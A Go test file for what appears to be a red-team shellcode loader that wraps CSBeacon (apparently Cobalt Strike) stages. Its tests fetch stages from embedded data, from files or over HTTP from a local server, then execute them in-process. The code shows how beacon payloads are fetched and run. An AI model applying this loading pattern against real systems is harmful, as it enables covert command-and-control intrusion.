package beacon

import (
	"encoding/hex"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/RTS-Framework/GRT-Develop/argument"
	"github.com/RTS-Framework/GRT-Develop/instance"
	"github.com/RTS-Framework/GRT-MXLoader/loader"
	"github.com/RTS-Framework/GRT-MXLoader/loader/xsyscall"
)

func TestCreateInstance(t *testing.T) {
	image := loader.NewFile("stage.dat")

	t.Run("x86", func(t *testing.T) {
		inst, err := CreateInstance("386", image, nil)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("x64", func(t *testing.T) {
		inst, err := CreateInstance("amd64", image, nil)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("custom template", func(t *testing.T) {
		template, err := os.ReadFile("../../dist/standard/CSBeacon_x86.bin")
		require.NoError(t, err)
		opts := Options{
			Template: template,
		}

		inst, err := CreateInstance("386", image, &opts)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("ignore instantiate options", func(t *testing.T) {
		template, err := os.ReadFile("../../dist/pipeline/CSBeacon_x86.bin")
		require.NoError(t, err)
		opts := Options{
			Template:       template,
			IgnoreInstOpts: true,
		}

		inst, err := CreateInstance("386", image, &opts)
		require.NoError(t, err)
		require.NotNil(t, inst)
	})

	t.Run("with additional arguments", func(t *testing.T) {
		t.Run("common", func(t *testing.T) {
			args := []*argument.Arg{
				{ID: 100, Data: []byte("config data")},
			}
			opts := Options{
				Arguments: args,
			}

			inst, err := CreateInstance("386", image, &opts)
			require.NoError(t, err)
			require.NotNil(t, inst)
		})

		t.Run("invalid id", func(t *testing.T) {
			args := []*argument.Arg{
				{ID: 1, Data: []byte("config data")},
			}
			opts := Options{
				Arguments: args,
			}

			inst, err := CreateInstance("386", image, &opts)
			errStr := "additional argument id must greater than 64"
			require.EqualError(t, err, errStr)
			require.Nil(t, inst)
		})
	})

	t.Run("invalid version", func(t *testing.T) {
		opts := Options{
			Version: "invalid",
		}

		inst, err := CreateInstance("386", image, &opts)
		errStr := "failed to encode beacon version: invalid version format: invalid"
		require.EqualError(t, err, errStr)
		require.Nil(t, inst)
	})

	t.Run("invalid image", func(t *testing.T) {
		opts := loader.EmbedOptions{
			Compress:   true,
			WindowSize: 40960,
		}
		embed := loader.NewEmbed([]byte{0x00}, &opts)

		inst, err := CreateInstance("386", embed, nil)
		errStr := "invalid embed mode config: failed to compress payload: invalid window size"
		require.EqualError(t, err, errStr)
		require.Nil(t, inst)
	})

	t.Run("invalid architecture", func(t *testing.T) {
		inst, err := CreateInstance("123", image, nil)
		require.EqualError(t, err, "invalid architecture: 123")
		require.Nil(t, inst)
	})

	t.Run("invalid template", func(t *testing.T) {
		opts := Options{
			Template: []byte{0x00},
		}

		inst, err := CreateInstance("386", image, &opts)
		require.EqualError(t, err, "invalid runtime template")
		require.Nil(t, inst)
	})

	t.Run("same argument id", func(t *testing.T) {
		args := []*argument.Arg{
			{ID: 100, Data: []byte("config data 1")},
			{ID: 100, Data: []byte("config data 2")},
		}
		opts := Options{
			Arguments: args,
		}

		inst, err := CreateInstance("386", image, &opts)
		errStr := "failed to encode argument: argument id 100 already exists"
		require.EqualError(t, err, errStr)
		require.Nil(t, inst)
	})
}

func TestInstance_Standard(t *testing.T) {
	if runtime.GOOS != "windows" {
		return
	}

	t.Run("x86", func(t *testing.T) {
		if runtime.GOARCH != "386" {
			return
		}

		t.Run("embed", func(t *testing.T) {
			testInstanceStandardEmbed(t)
		})

		t.Run("file", func(t *testing.T) {
			testInstanceStandardFile(t)
		})

		t.Run("http", func(t *testing.T) {
			testInstanceStandardHTTP(t)
		})
	})

	t.Run("x64", func(t *testing.T) {
		if runtime.GOARCH != "amd64" {
			return
		}

		t.Run("embed", func(t *testing.T) {
			testInstanceStandardEmbed(t)
		})

		t.Run("file", func(t *testing.T) {
			testInstanceStandardFile(t)
		})

		t.Run("http", func(t *testing.T) {
			testInstanceStandardHTTP(t)
		})
	})
}

func testInstanceStandardEmbed(t *testing.T) {
	var path string
	switch runtime.GOARCH {
	case "386":
		path = "testdata/stage_x86.dat"
	case "amd64":
		path = "testdata/stage_x64.dat"
	}
	stage, err := os.ReadFile(path)
	require.NoError(t, err)
	image := loader.NewEmbed(stage, nil)

	opts := &Options{
		testWait: true,
	}
	inst, err := CreateInstance(runtime.GOARCH, image, opts)
	require.NoError(t, err)

	testLoadInstance(t, inst)
}

func testInstanceStandardFile(t *testing.T) {
	var path string
	switch runtime.GOARCH {
	case "386":
		path = "testdata/stage_x86.dat"
	case "amd64":
		path = "testdata/stage_x64.dat"
	}
	image := loader.NewFile(path)

	opts := &Options{
		testWait: true,
	}
	inst, err := CreateInstance(runtime.GOARCH, image, opts)
	require.NoError(t, err)

	testLoadInstance(t, inst)
}

func testInstanceStandardHTTP(t *testing.T) {
	// start an http server
	path, err := filepath.Abs("testdata")
	require.NoError(t, err)
	serverMux := http.NewServeMux()
	serverMux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Header.Get("Header1") != "h1" {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		if r.Header.Get("Header2") != "h2" {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		if r.UserAgent() != "ua" {
			w.WriteHeader(http.StatusForbidden)
			return
		}
		http.FileServer(http.Dir(path)).ServeHTTP(w, r)
	})
	server := http.Server{
		Handler: serverMux,
	}
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	require.NoError(t, err)
	httpAddr := listener.Addr().String()
	go func() {
		_ = server.Serve(listener)
	}()
	defer func() {
		_ = server.Close()
	}()

	headers := make(http.Header)
	headers.Set("Header1", "h1")
	headers.Set("Header2", "h2")
	httpOpts := &loader.HTTPOptions{
		Headers:   headers,
		UserAgent: "ua",
	}
	httpOpts.Headers.Set("Header1", "h1")

	var URL string
	switch runtime.GOARCH {
	case "386":
		URL = fmt.Sprintf("http://%s/stage_x86.dat", httpAddr)
	case "amd64":
		URL = fmt.Sprintf("http://%s/stage_x64.dat", httpAddr)
	}
	image := loader.NewHTTP(URL, httpOpts)

	opts := &Options{
		testWait: true,
	}
	inst, err := CreateInstance(runtime.GOARCH, image, opts)
	require.NoError(t, err)

	testLoadInstance(t, inst)
}

func TestInstance_Pipeline(t *testing.T) {
	if runtime.GOOS != "windows" {
		return
	}

	t.Run("x86", func(t *testing.T) {
		if runtime.GOARCH != "386" {
			return
		}

		stage, err := os.ReadFile("testdata/stage_x86.dat")
		require.NoError(t, err)
		image := loader.NewEmbed(stage, nil)

		opts := &Options{
			Template:       testBuildTemplate(t),
			IgnoreInstOpts: true,
			testWait:       true,
		}
		inst, err := CreateInstance("386", image, opts)
		require.NoError(t, err)

		testLoadInstance(t, inst)
	})

	t.Run("x64", func(t *testing.T) {
		if runtime.GOARCH != "amd64" {
			return
		}

		stage, err := os.ReadFile("testdata/stage_x64.dat")
		require.NoError(t, err)
		image := loader.NewEmbed(stage, nil)

		opts := &Options{
			Template:       testBuildTemplate(t),
			IgnoreInstOpts: true,
			testWait:       true,
		}
		inst, err := CreateInstance("amd64", image, opts)
		require.NoError(t, err)

		testLoadInstance(t, inst)
	})
}

func testBuildTemplate(t *testing.T) []byte {
	var (
		boot []byte
		ldr  []byte
		rti  []byte
		err  error
	)
	switch runtime.GOARCH {
	case "386":
		boot, err = os.ReadFile("../../dist/pipeline/CSBeacon_x86.bin")
		require.NoError(t, err)
		ldr, err = os.ReadFile("../../asm/inst/pe_loader_x86.inst")
		require.NoError(t, err)
		rti, err = os.ReadFile("../../asm/inst/runtime_x86.inst")
		require.NoError(t, err)
	case "amd64":
		boot, err = os.ReadFile("../../dist/pipeline/CSBeacon_x64.bin")
		require.NoError(t, err)
		ldr, err = os.ReadFile("../../asm/inst/pe_loader_x64.inst")
		require.NoError(t, err)
		rti, err = os.ReadFile("../../asm/inst/runtime_x64.inst")
		require.NoError(t, err)
	default:
		t.Fatal("unsupported architecture")
	}
	ldr = testInstToBin(t, ldr)
	rti = testInstToBin(t, rti)

	instOpts := instance.Options{
		SkipArguments: true,
	}
	rti, err = instance.Instantiate(rti, &instOpts)
	require.NoError(t, err)

	template, err := loader.BuildTemplate(boot, ldr, rti)
	require.NoError(t, err)
	return template
}

func testInstToBin(t *testing.T, i []byte) []byte {
	s := string(i)
	s = strings.ReplaceAll(s, ",", "")
	s = strings.ReplaceAll(s, " 0", "")
	s = strings.ReplaceAll(s, "db", "")
	s = strings.ReplaceAll(s, "h", "")
	s = strings.ReplaceAll(s, " ", "")
	s = strings.ReplaceAll(s, "\r\n", "")
	bin, err := hex.DecodeString(s)
	require.NoError(t, err)
	return bin
}

func testLoadInstance(t *testing.T, inst []byte) {
	now := time.Now()

	addr := xsyscall.LoadInstance(t, inst)
	ret, _, _ := xsyscall.SyscallN(addr, 0)
	require.Zero(t, ret, fmt.Sprintf("0x%X", ret))

	d := time.Since(now)
	require.Greater(t, d, time.Second)
}
